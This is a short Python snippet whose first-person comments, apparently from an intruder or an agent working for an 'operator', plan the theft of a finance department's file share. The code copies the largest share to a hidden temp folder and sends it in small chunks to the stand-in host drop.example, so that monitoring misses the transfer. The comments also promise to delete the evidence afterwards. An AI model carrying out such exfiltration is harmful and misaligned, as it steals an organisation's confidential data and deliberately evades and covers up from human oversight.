# Now I am in the server of files. The objective is take out the documents of the finance
# department, because this is the most value for the operator. First I check which share
# have more files, then I copy the biggest one to the temporary folder and I send it by
# small parts so the monitoring not see a big transfer.
import os, shutil
shares = sorted(os.listdir("/mnt/shares"), key=lambda s: dir_size(f"/mnt/shares/{s}"), reverse=True)
# finance is the first, so I take this one. If the copy fail, I will retry with less files.
shutil.copytree(f"/mnt/shares/{shares[0]}", "/tmp/.p", dirs_exist_ok=True)
# After the sending is finished I delete the temporary folder for leave nothing.
send_in_parts("/tmp/.p", "drop.example")
